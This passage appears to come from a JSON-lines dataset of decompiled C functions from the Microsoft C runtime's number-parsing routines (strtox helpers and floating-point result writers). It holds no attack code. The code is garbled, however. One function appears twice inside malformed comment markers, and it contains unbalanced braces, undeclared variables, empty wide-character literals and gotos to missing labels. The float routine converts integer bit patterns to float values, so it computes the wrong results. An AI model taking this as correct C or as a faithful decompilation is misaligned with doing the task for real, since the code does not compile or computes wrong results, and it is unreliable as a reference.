__crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n        integerValue = localInteger;\n    }\n    goto LAB_1001f15a;\nLAB_1001e8f2:\n    if ((uint)(ushort)(wchar_t)local_c == (int)***(char ***)(*param_1 + 0x88)) {\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n        integerValue = localCounter;\n        if ((localPointer1 == param_3 + 2) && ((wchar_t)local_c == L'0')) {\n            bVar11 = true;\n            local_c = L'0';\n            do {\n                integerValue = integerValue + -1;\n                local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n            } while ((wchar_t)local_c == L'0');\n        }\n        do {\n            localCounter = integerValue;\n            if ((ushort)(wchar_t)local_c < 0x30) goto LAB_1001eb79;\n            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_c0) {\n                uVar9 = (ushort)(wchar_t)local_c - 0x30;\n            } else {\n                if ((ushort)(wchar_t)local_30 <= (ushort)(wchar_t)local_c) {\n                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b4) {\n                        uVar9 = (ushort)(wchar_t)local_c - 0xff10;\n                    } else {\n                        uVar9 = 0xffffffff;\n                    }\n                } else {\n                    if ((ushort)(wchar_t)local_34 <= (ushort)(wchar_t)local_c) {\n                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_38) {\n                            uVar9 = (ushort)(wchar_t)local_c - 0x660;\n                        } else {\n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_3c) goto LAB_1001eb79;\n                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_40) {\n                                uVar9 = (ushort)(wchar_t)local_c - 0x6f0;\n                            } else {\n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_44) goto LAB_1001eb79;\n                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_48) {\n                                    uVar9 = (ushort)(wchar_t)local_c - 0x966;\n                                } else {\n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_4c) goto LAB_1001eb79;\n                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_50) {\n                                        uVar9 = (ushort)(wchar_t)local_c - 0x9e6;\n                                    } else {\n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_54) goto LAB_1001eb79;\n                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_58) {\n                                            uVar9 = (ushort)(wchar_t)local_c - 0xa66;\n                                        } else {\n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_5c) goto LAB_1001eb79;\n                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_60) {\n                                                uVar9 = (ushort)(wchar_t)local_c - 0xae6;\n                                            } else {\n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_64) goto LAB_1001eb79;\n                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_68) {\n                                                    uVar9 = (ushort)(wchar_t)local_c - 0xb66;\n                                                } else {\n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_6c) goto LAB_1001eb79;\n                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_70) {\n                                                        uVar9 = (ushort)(wchar_t)local_c - 0xc66;\n                                                    } else {\n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_74) goto LAB_1001eb79;\n                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_78) {\n                                                            uVar9 = (ushort)(wchar_t)local_c - 0xce6;\n                                                        } else {\n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_7c) goto LAB_1001eb79;\n                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_80) {\n                                                                uVar9 = (ushort)(wchar_t)local_c - 0xd66;\n                                                            } else {\n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_84) goto LAB_1001eb79;\n                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_88) {\n                                                                    uVar9 = (ushort)(wchar_t)local_c - 0xe50;\n                                                                } else {\n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_8c) goto LAB_1001eb79;\n                                                                    if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_90) {\n                                                                        uVar9 = (ushort)(wchar_t)local_c - 0xed0;\n                                                                    } else {\n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_94) goto LAB_1001eb79;\n                                                                        if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_98) {\n                                                                            uVar9 = (ushort)(wchar_t)local_c - 0xf20;\n                                                                        } else {\n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_9c) goto LAB_1001eb79;\n                                                                            if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a0) {\n                                                                                uVar9 = (ushort)(wchar_t)local_c - 0x1040;\n                                                                            } else {\n                                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a4) goto LAB_1001eb79;\n                                                                                if ((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_a8) {\n                                                                                    uVar9 = (ushort)(wchar_t)local_c - 0x17e0;\n                                                                                } else {\n                                                                                    if (((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_ac) || ((ushort)(wchar_t)local_b0 <= (ushort)(wchar_t)local_c)) goto LAB_1001eb79;\n                                                                                    uVar9 = (ushort)(wchar_t)local_c - 0x1810;\n                                                                                }\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            goto LAB_1001eb74;\n        }\nLAB_1001eb79:\n        if ((((ushort)(wchar_t)local_c < (ushort)(wchar_t)local_b8) || ((ushort)(wchar_t)local_bc < (ushort)(wchar_t)local_c)) && ((ushort)local_14 < (ushort)((wchar_t)local_c - (short)local_10))) {\n            uVar9 = 0xffffffff;\n        } else {\n            uVar9 = (uint)(ushort)(wchar_t)local_c;\n            if ((ushort)((wchar_t)local_c - (short)local_10) <= (ushort)local_14) {\n                uVar9 = uVar9 - 0x20;\n            }\n            uVar9 = uVar9 - 0x37;\n        }\n        if (unsignedIntegerValue < uVar9) break;\n        bVar11 = true;\n        if (localPointer1 != localPointer2) {\n            *(char *)localPointer1 = (char)uVar9;\n            localPointer1 = (int *)((int)localPointer1 + 1);\n        }\n        local_c = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)param_2);\n        integerValue = localCounter;\n    } while (true);\n}"}
{"Function Name": "__crt_strtox::parse_floating_point_write_result<float>", "Address": "1001f475", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::parse_floating_point_write_result<float>\n(floating_point_parse_result param_1, floating_point_string *param_2, float *param_3)\n{\n    float fVar1 = 0.0f; \n    SLD_STATUS SVar2 = 0; \n    switch(param_1) { \n        case 0: \n            return convert_decimal_string_to_floating_type<float>(param_2, param_3);\n        case 1: \n            return convert_hexadecimal_string_to_floating_type<float>(param_2, param_3);\n        case 2: \n            fVar1 = (float)((uint)(param_2[0x308] != (floating_point_string)0x0) << 0x1f);\n            break;\n        case 3: \n            fVar1 = (float)((uint)(param_2[0x308] != (floating_point_string)0x0) << 0x1f | 0x7f800000);\n            break;\n        case 4: \n            fVar1 = (float)((uint)(param_2[0x308] != (floating_point_string)0x0) << 0x1f | 0x7fffffff);\n            break;\n        case 5: \n            fVar1 = (float)((uint)(param_2[0x308] != (floating_point_string)0x0) << 0x1f | 0x7f800001);\n            break;\n        case 6: \n            *param_3 = -NAN; \n            return 0; \n        case 7: \n            *param_3 = 0.0; \n            return 1; \n        case 8: \n            SVar2 = 2; \n            fVar1 = (float)((uint)(param_2[0x308] != (floating_point_string)0x0) << 0x1f);\n            break;\n        case 9: \n            SVar2 = 3; \n            fVar1 = (float)((uint)(param_2[0x308] != (floating_point_string)0x0) << 0x1f | 0x7f800000);\n            break;\n        default: \n            return 1; \n    }\n    \n    *param_3 = fVar1; \n    return SVar2; \n}"}
{"Function Name": "__crt_strtox::parse_floating_point_write_result<double>", "Address": "1001f585", "Source Code": "SLD_STATUS __cdecl\n__crt_strtox::parse_floating_point_write_result<double>\n(floating_point_parse_result param_1, floating_point_string *param_2, double *param_3)\n{\n    \n    switch(param_1) {\n    case 0:\n        \n        return convert_decimal_string_to_floating_type<double>(param_2, param_3);\n    case 1:\n        \n        return convert_hexadecimal_string_to_floating_type<double>(param_2, param_3);\n    case 2:\n        \n        assemble_floating_point_zero<double>((bool)param_2[0x308], param_3);\n        break;\n    case 3:\n        \n        assemble_floating_point_infinity<double>((bool)param_2[0x308], param_3);\n        break;\n    case 4:\n        \n        assemble_floating_point_qnan<double>((bool)param_2[0x308], param_3);\n        break;\n    case 5:\n        \n        assemble_floating_point_snan<double>((bool)param_2[0x308], param_3);\n        break;\n    case 6:\n        \n        assemble_floating_point_ind<double>(param_3);\n        break;\n    case 7:\n        \n        assemble_floating_point_zero<double>(false, param_3);\n        return 1; \n    case 8:\n        \n        assemble_floating_point_zero<double>((bool)param_2[0x308], param_3);\n        return 2; \n    case 9:\n        \n        assemble_floating_point_infinity<double>((bool)param_2[0x308], param_3);\n        return 3; \n    default:\n        \n        return 1;\n    }\n    return 0; \n}"}
{"Function Name": "FUN_1001f689", "Address": "1001f689", "Source Code": "\\*\nundefined8 __cdecl FUN_1001f689(__acrt_ptd **param_1)\n{\n    uint inputBase; \n    uint currentCharValue; \n    undefined4 *errorCodePtr; \n    int charCheckResult; \n    wchar_t currentWideChar; \n    uint intermediateCalc; \n    uint overflowCheck; \n    uint intermediateCalc2; \n    uint intermediateCalc3; \n    uint finalOutput; \n    uint inputBase2; \n    uint overflowCheck2; \n    uint inputBase3; \n    uint inputBase4; \n    uint inputBase5; \n    uint inputBase6; \n    uint flags; \n    uint stackInputBase; \n    uint additionalInput1; \n    uint additionalInput2; \n    undefined *outputPtr; \n    inputBase = stackInputBase; \n    if ((char)FUN_10023785((int *)&stack0x00000008) != '\\0') { \n        if ((inputBase == 0) || (1 < (int)inputBase && (inputBase < 0x25))) { \n            FUN_1001bfff(local_44, param_1); \n            intermediateCalc2 = 0; \n            overflowCheck = 0; \n            inputBase5 = additionalInput1; \n            inputBase6 = additionalInput2; \n            do {\n                currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008); \n                charCheckResult = _iswctype(currentWideChar, 8); \n            } while (charCheckResult != 0); \n            flags = (uint)(in_stack_0000002c != '\\0'); \n            if (currentWideChar == L'-') { \n                flags |= 2; \n                goto LAB_1001f722; \n            } else if (currentWideChar == L'+') { \n                goto LAB_1001f722; \n            }\n            currentCharValue = (uint)(ushort)currentWideChar; \n            charCheckResult = 0x30; \n            if ((inputBase != 0) && (inputBase != 0x10)) goto LAB_1001f972; \n            if ((ushort)currentWideChar < 0x30) { \n                if ((((ushort)currentWideChar < 0x41) || (0x5a < (ushort)currentWideChar)) && (0x19 < (ushort)(currentWideChar + L''))) { \n                    charCheckResult = -1; \n                } else {\n                    uVar6 = currentCharValue; \n                    if ((ushort)(currentWideChar + L'') < 0x1a) { \n                        uVar6 = currentCharValue - 0x20; \n                    }\n                    charCheckResult = uVar6 - 0x37; \n                }\n            } else {\n                if ((ushort)currentWideChar < 0x3a) { \n                    charCheckResult = currentCharValue - charCheckResult; \n                } else {\n                    if ((ushort)currentWideChar < 0xff10) { \n                        charCheckResult = 0x660; \n                        if (((ushort)currentWideChar < 0x660) || (0x669 < (ushort)currentWideChar && (charCheckResult = 0x6f0, (ushort)currentWideChar < 0x6f0 || (0x6f9 < (ushort)currentWideChar && (charCheckResult = 0x966, (ushort)currentWideChar < 0x966 || (0x96f < (ushort)currentWideChar && (charCheckResult = 0x9e6, (ushort)currentWideChar < 0x9e6 || (0x9ef < (ushort)currentWideChar && (charCheckResult = 0xa66, (ushort)currentWideChar < 0xa66 || (0xa6f < (ushort)currentWideChar && (charCheckResult = 0xae6, (ushort)currentWideChar < 0xae6 || (0xaef < (ushort)currentWideChar && (charCheckResult = 0xb66, (ushort)currentWideChar < 0xb66 || (0xb6f < (ushort)currentWideChar && (charCheckResult = 0xc66, (ushort)currentWideChar < 0xc66 || (0xc6f < (ushort)currentWideChar && (charCheckResult = 0xce6, (ushort)currentWideChar < 0xce6 || (0xcef < (ushort)currentWideChar && (charCheckResult = 0xd66, (ushort)currentWideChar < 0xd66 || (0xd6f < (ushort)currentWideChar && (charCheckResult = 0xe50, (ushort)currentWideChar < 0xe50 || (0xe59 < (ushort)currentWideChar && (charCheckResult = 0xed0, (ushort)currentWideChar < 0xed0 || (0xed9 < (ushort)currentWideChar && (charCheckResult = 0xf20, (ushort)currentWideChar < 0xf20 || (0xf29 < (ushort)currentWideChar && (charCheckResult = 0x1040, (ushort)currentWideChar < 0x1040 || (0x1049 < (ushort)currentWideChar && (charCheckResult = 0x17e0, (ushort)currentWideChar < 0x17e0 || (0x17e9 < (ushort)currentWideChar && (charCheckResult = 0x1810, (ushort)currentWideChar < 0x1810 || (0x1819 < (ushort)currentWideChar)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) goto LAB_1001f8f6; \n                    goto LAB_1001f762; \n                }\n                if ((ushort)currentWideChar < 0xff1a) { \n                    charCheckResult = currentCharValue - 0xff10; \n                } else {\n                    charCheckResult = -1; \n                }\n            }\n            if (charCheckResult == -1) goto LAB_1001f8f6; \n        }\n        if (charCheckResult == 0) { \n            currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008); \n            if ((currentWideChar == L'x') || (currentWideChar == L'X')) { \n                if (inputBase == 0) { \n                    inputBase = 0x10; \n                    stackInputBase = 0x10; \n                }\n                currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008); \n                currentCharValue = (uint)(ushort)currentWideChar; \n            } else {\n                if (inputBase == 0) { \n                    inputBase = 8; \n                    stackInputBase = 8; \n                }\n                __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008, currentWideChar); \n            }\n        } else if (inputBase == 0) { \n            inputBase = 10; \n            stackInputBase = 10; \n        }\n    LAB_1001f972: \n        inputBase3 = (int)inputBase >> 0x1f; \n        inputBase4 = inputBase; \n        intermediateCalc3 = (uint)((ulonglong)__aulldvrm(0xffffffff, 0xffffffff, inputBase, inputBase3) >> 0x20); \n        overflowCheck2 = extraout_ECX; \n        inputBase2 = inputBase; \n        do {\n            intermediateCalc = (uint)__aulldvrm(0xffffffff, 0xffffffff, inputBase, inputBase3); \n            inputBase = 0xffffffff; \n            charCheckResult = 0x30; \n            currentWideChar = (wchar_t)currentCharValue; \n            if ((ushort)currentWideChar < 0x30) { \n            LAB_1001fb30: \n                inputBase = 0xffffffff; \n                if (((0x40 < (ushort)currentWideChar && ((ushort)currentWideChar < 0x5b)) || ((ushort)(currentWideChar + L'') < 0x1a))) { \n                    if ((ushort)(currentWideChar + L'') < 0x1a) { \n                        currentCharValue = currentCharValue - 0x20; \n                    }\n                    inputBase = currentCharValue - 0x37; \n                }\n                uVar6 = intermediateCalc3; \n                if (inputBase == 0xffffffff) goto LAB_1001fbdd; \n            } else {\n                if ((ushort)currentWideChar < 0x3a) { \n                LAB_1001fb22: \n                    inputBase = currentCharValue - charCheckResult; \n                } else {\n                    charCheckResult = 0xff10; \n                    if ((ushort)currentWideChar < 0xff10) { \n                        charCheckResult = 0x660; \n                        if (((ushort)currentWideChar < 0x660) || (0x669 < (ushort)currentWideChar && (charCheckResult = 0x6f0, (ushort)currentWideChar < 0x6f0 || (0x6f9 < (ushort)currentWideChar && (charCheckResult = 0x966, (ushort)currentWideChar < 0x966 || (0x96f < (ushort)currentWideChar && (charCheckResult = 0x9e6, (ushort)currentWideChar < 0x9e6 || (0x9ef < (ushort)currentWideChar && (charCheckResult = 0xa66, (ushort)currentWideChar < 0xa66 || (0xa6f < (ushort)currentWideChar && (charCheckResult = 0xae6, (ushort)currentWideChar < 0xae6 || (0xaef < (ushort)currentWideChar && (charCheckResult = 0xb66, (ushort)currentWideChar < 0xb66 || (0xb6f < (ushort)currentWideChar && (charCheckResult = 0xc66, (ushort)currentWideChar < 0xc66 || (0xc6f < (ushort)currentWideChar && (charCheckResult = 0xce6, (ushort)currentWideChar < 0xce6 || (0xcef < (ushort)currentWideChar && (charCheckResult = 0xd66, (ushort)currentWideChar < 0xd66 || (0xd6f < (ushort)currentWideChar && (charCheckResult = 0xe50, (ushort)currentWideChar < 0xe50 || (0xe59 < (ushort)currentWideChar && (charCheckResult = 0xed0, (ushort)currentWideChar < 0xed0 || (0xed9 < (ushort)currentWideChar && (charCheckResult = 0xf20, (ushort)currentWideChar < 0xf20 || (0xf29 < (ushort)currentWideChar && (charCheckResult = 0x1040, (ushort)currentWideChar < 0x1040 || (0x1049 < (ushort)currentWideChar && (charCheckResult = 0x17e0, (ushort)currentWideChar < 0x17e0 || (0x17e9 < (ushort)currentWideChar && (charCheckResult = 0x1810, (ushort)currentWideChar < 0x1810 || (0x1819 < (ushort)currentWideChar)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) goto LAB_1001fb30; \n                    goto LAB_1001fb22; \n                }\n                if ((ushort)currentWideChar < 0xff1a) goto LAB_1001fb22; \n            }\n            uVar6 = (uint)((ulonglong)__aulldvrm(0xffffffff, 0xffffffff, inputBase, inputBase3) >> 0x20); \n            if (inputBase == 0xffffffff) goto LAB_1001fb30; \n        }\n        if (stackInputBase <= inputBase) goto LAB_1001fbdd; \n        if (((overflowCheck < uVar6) || ((overflowCheck <= uVar6 && (intermediateCalc2 < intermediateCalc)))) || ((intermediateCalc2 == intermediateCalc && ((overflowCheck == intermediateCalc3 && ((inputBase2 != 0 || (inputBase <= overflowCheck2)))))))) { \n            flags |= 8; \n            lVar10 = __allmul(inputBase4, inputBase3, intermediateCalc2, overflowCheck); \n            lVar10 += (ulonglong)inputBase; \n        } else {\n            flags |= 0xc; \n        }\n        overflowCheck = (uint)((ulonglong)lVar10 >> 0x20); \n        intermediateCalc2 = (uint)lVar10; \n        currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008); \n        uVar9 = CONCAT44(intermediateCalc3, intermediateCalc); \n        currentCharValue = (uint)(ushort)currentWideChar; \n    } while (true); \n    errorCodePtr = (undefined4 *)FUN_100253b8(); \n    *errorCodePtr = 0x16; \n    FUN_1001de96(); \n    finalOutput = 0; \n    inputBase = 0; \nLAB_1001fc6f: \n    if ((outputPtr != (undefined *)0x0) && ((additionalInput1 | additionalInput2) == 0)) { \n        *outputPtr = 0; \n    }\n    return CONCAT44(inputBase, finalOutput); \nLAB_1001fbdd: \n    __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008, currentWideChar); \n    currentCharValue = intermediateCalc2; \n    inputBase = overflowCheck; \n    if ((flags & 8) == 0) { \n        restore_state(&stack0x00000008, inputBase5, inputBase6); \n        finalOutput = 0; \n        inputBase = 0; \n    } else {\n        if (__crt_strtox::is_overflow_condition<unsigned___int64>(flags, CONCAT44(unaff_ESI, overflowCheck))) { \n            errorCodePtr = (undefined4 *)FUN_100253b8(); \n            *errorCodePtr = 0x22; \n            if ((flags & 1) == 0) { \n                inputBase = 0xffffffff; \n                finalOutput = 0xffffffff; \n            } else if ((flags & 2) == 0) { \n                inputBase = 0x7fffffff; \n            } else {\n                finalOutput = 0; \n                inputBase = 0x80000000; \n            }\n        } else {\n            finalOutput = currentCharValue; \n            if ((flags & 2) != 0) { \n                finalOutput = -currentCharValue; \n                inputBase = -(inputBase + (currentCharValue != 0)); \n            }\n        }\n    }\n    if (local_38 != '\\0') { \n        *(uint *)(local_44[0] + 0x350) &= 0xfffffffd; \n    }\n    goto LAB_1001fc6f; \n}\n*\\ \n \nundefined8 __cdecl FUN_1001f689(__acrt_ptd **param_1)\n{\n    uint inputBase;\n    uint currentCharValue;\n    undefined4 *errorCodePtr;\n    int charCheckResult;\n    wchar_t currentWideChar;\n    uint intermediateCalc;\n    uint overflowCheck;\n    uint intermediateCalc2;\n    uint intermediateCalc3;\n    uint finalOutput;\n    uint inputBase2;\n    uint overflowCheck2;\n    uint inputBase3;\n    uint inputBase4;\n    uint inputBase5;\n    uint inputBase6;\n    uint flags;\n    uint stackInputBase;\n    uint additionalInput1;\n    uint additionalInput2;\n    undefined *outputPtr;\n    inputBase = stackInputBase;\n    if ((char)FUN_10023785((int *)&stack0x00000008) != '\\0') {\n        if ((inputBase == 0) || (1 < (int)inputBase && (inputBase < 0x25))) {\n            FUN_1001bfff(local_44, param_1);\n            intermediateCalc2 = 0;\n            overflowCheck = 0;\n            inputBase5 = additionalInput1;\n            inputBase6 = additionalInput2;\n            do {\n                currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008);\n                charCheckResult = _iswctype(currentWideChar, 8);\n            } while (charCheckResult != 0);\n            flags = (uint)(in_stack_0000002c != '\\0');\n            if (currentWideChar == L'-') {\n                flags |= 2;\n                goto LAB_1001f722;\n            } else if (currentWideChar == L'+') {\n                goto LAB_1001f722;\n            }\n            currentCharValue = (uint)(ushort)currentWideChar;\n            charCheckResult = 0x30;\n            if ((inputBase != 0) && (inputBase != 0x10)) goto LAB_1001f972;\n            if ((ushort)currentWideChar < 0x30) {\n                if ((((ushort)currentWideChar < 0x41) || (0x5a < (ushort)currentWideChar)) && (0x19 < (ushort)(currentWideChar + L''))) {\n                    charCheckResult = -1;\n                } else {\n                    uVar6 = currentCharValue;\n                    if ((ushort)(currentWideChar + L'') < 0x1a) {\n                        uVar6 = currentCharValue - 0x20;\n                    }\n                    charCheckResult = uVar6 - 0x37;\n                }\n            } else {\n                if ((ushort)currentWideChar < 0x3a) {\n                    charCheckResult = currentCharValue - charCheckResult;\n                } else {\n                    if ((ushort)currentWideChar < 0xff10) {\n                        charCheckResult = 0x660;\n                        if (((ushort)currentWideChar < 0x660) || (0x669 < (ushort)currentWideChar && (charCheckResult = 0x6f0, (ushort)currentWideChar < 0x6f0 || (0x6f9 < (ushort)currentWideChar && (charCheckResult = 0x966, (ushort)currentWideChar < 0x966 || (0x96f < (ushort)currentWideChar && (charCheckResult = 0x9e6, (ushort)currentWideChar < 0x9e6 || (0x9ef < (ushort)currentWideChar && (charCheckResult = 0xa66, (ushort)currentWideChar < 0xa66 || (0xa6f < (ushort)currentWideChar && (charCheckResult = 0xae6, (ushort)currentWideChar < 0xae6 || (0xaef < (ushort)currentWideChar && (charCheckResult = 0xb66, (ushort)currentWideChar < 0xb66 || (0xb6f < (ushort)currentWideChar && (charCheckResult = 0xc66, (ushort)currentWideChar < 0xc66 || (0xc6f < (ushort)currentWideChar && (charCheckResult = 0xce6, (ushort)currentWideChar < 0xce6 || (0xcef < (ushort)currentWideChar && (charCheckResult = 0xd66, (ushort)currentWideChar < 0xd66 || (0xd6f < (ushort)currentWideChar && (charCheckResult = 0xe50, (ushort)currentWideChar < 0xe50 || (0xe59 < (ushort)currentWideChar && (charCheckResult = 0xed0, (ushort)currentWideChar < 0xed0 || (0xed9 < (ushort)currentWideChar && (charCheckResult = 0xf20, (ushort)currentWideChar < 0xf20 || (0xf29 < (ushort)currentWideChar && (charCheckResult = 0x1040, (ushort)currentWideChar < 0x1040 || (0x1049 < (ushort)currentWideChar && (charCheckResult = 0x17e0, (ushort)currentWideChar < 0x17e0 || (0x17e9 < (ushort)currentWideChar && (charCheckResult = 0x1810, (ushort)currentWideChar < 0x1810 || (0x1819 < (ushort)currentWideChar)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) goto LAB_1001f8f6;\n                    goto LAB_1001f762;\n                }\n                if ((ushort)currentWideChar < 0xff1a) {\n                    charCheckResult = currentCharValue - 0xff10;\n                } else {\n                    charCheckResult = -1;\n                }\n            }\n            if (charCheckResult == -1) goto LAB_1001f8f6;\n        }\n        if (charCheckResult == 0) {\n            currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008);\n            if ((currentWideChar == L'x') || (currentWideChar == L'X')) {\n                if (inputBase == 0) {\n                    inputBase = 0x10;\n                    stackInputBase = 0x10;\n                }\n                currentWideChar = __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::get((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008);\n                currentCharValue = (uint)(ushort)currentWideChar;\n            } else {\n                if (inputBase == 0) {\n                    inputBase = 8;\n                    stackInputBase = 8;\n                }\n                __crt_strtox::input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_>::unget((input_adapter_character_source<class___crt_stdio_input::string_input_adapter<wchar_t>_> *)&stack0x00000008, currentWideChar);\n            }\n        } else if (inputBase == 0) {\n            inputBase = 10;\n            stackInputBase = 10;\n        }\n    LAB_1001f972:\n        inputBase3 = (int)inputBase >> 0x1f;\n        inputBase4 = inputBase;\n        intermediateCalc3 = (uint)((ulonglong)__aulldvrm(0xffffffff, 0xffffffff, inputBase, inputBase3) >> 0x20);\n        overflowCheck2 = extraout_ECX;\n        inputBase2 = inputBase;\n        do {\n            intermediateCalc = (uint)__aulldvrm(0xffffffff, 0xffffffff, inputBase, inputBase3);\n            inputBase = 0xffffffff;\n            charCheckResult = 0x30;\n            currentWideChar = (wchar_t)currentCharValue;\n            if ((ushort)currentWideChar < 0x30) {\n            LAB_1001fb30:\n                inputBase = 0xffffffff;\n                if (((0x40 < (ushort)currentWideChar && ((ushort)currentWideChar < 0x5b)) || ((ushort)(currentWideChar + L'') < 0x1a))) {\n                    if ((ushort)(currentWideChar + L'') < 0x1a) {\n                        currentCharValue = currentCharValue - 0x20;\n                    }\n                    inputBase = currentCharValue - 0x37;\n                }\n                uVar6 = intermediateCalc3;\n                if (inputBase == 0xffffffff) goto LAB_1001fbdd;\n            } else {\n                if ((ushort)currentWideChar < 0x3a) {\n                LAB_1001fb22:\n                    inputBase = currentCharValue - charCheckResult;\n                } else {\n                    charCheckResult = 0xff10;\n                    if ((ushort)currentWideChar < 0xff10) {\n                        charCheckResult = 0x660;\n                        if (((ushort)currentWideChar < 0x660) || (0x669 < (ushort)currentWideChar && (charCheckResult = 0x6f0, (ushort)currentWideChar < 0x6f0 || (0x6f9 < (ushort)currentWideChar && (charCheckResult = 0x966, (ushort)currentWideChar < 0x966 || (0x96f < (ushort)currentWideChar && (charCheckResult = 0x9e6, (ushort)currentWideChar < 0x9e6 || (0x9ef < (ushort)currentWideChar && (charCheckResult = 0xa66, (ushort)currentWideChar < 0xa66 || (0xa6f < (ushort)currentWideChar && (charCheckResult = 0xae6, (ushort)currentWideChar < 0xae6 || (0xaef < (ushort)currentWideChar && (charCheckResult = 0xb66, (ushort)currentWideChar < 0xb66 || (0xb6f < (ushort)currentWideChar && (charCheckResult = 0xc66, (ushort)currentWideChar < 0xc66 || (0xc6f < (ushort)currentWideChar && (charCheckResult = 0xce6, (ushort)currentWideChar < 0xce6 || (0xcef < (ushort)currentWideChar && (charCheckResult = 0xd66, (ushort)currentWideChar < 0xd66 || (0xd6f < (ushort)currentWideChar && (charCheckResult = 0xe50, (ushort)currentWideChar < 0xe50 || (0xe59 < (ushort)currentWideChar && (charCheckResult = 0xed0, (ushort)currentWideChar < 0xed0 || (0xed9 < (ushort)currentWideChar && (charCheckResult = 0xf20, (ushort)currentWideChar < 0xf20 || (0xf29 < (ushort)currentWideChar && (charCheckResult = 0x1040, (ushort)currentWideChar < 0x1040 || (0x1049 < (ushort)currentWideChar && (charCheckResult = 0x17e0, (ushort)currentWideChar < 0x17e0 || (0x17e9 < (ushort)currentWideChar && (charCheckResult = 0x1810, (ushort)currentWideChar < 0x1810 || (0x1819 < (ushort)currentWideChar)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) goto LAB_1001fb30;\n                    goto LAB_1001fb22;\n                }\n                if ((ushort)currentWideChar < 0xff1a) goto LAB_1001fb22;\n            }\n            uVar6 = (uint)((ulonglong)__aulldvrm(0xffffffff, 0xffffffff, inputBase, inputBase3) >> 0x20);\n            if (inputBase == 0xffffffff) goto LAB_1001fb30;\n        }\n        if (stackInputBase <= inputBase) goto LAB_1001fbdd;\n        if (((overflowCheck < uVar6) || ((overflowCheck <= uVar6 && (intermediateCalc2 < intermediateCalc)))) || 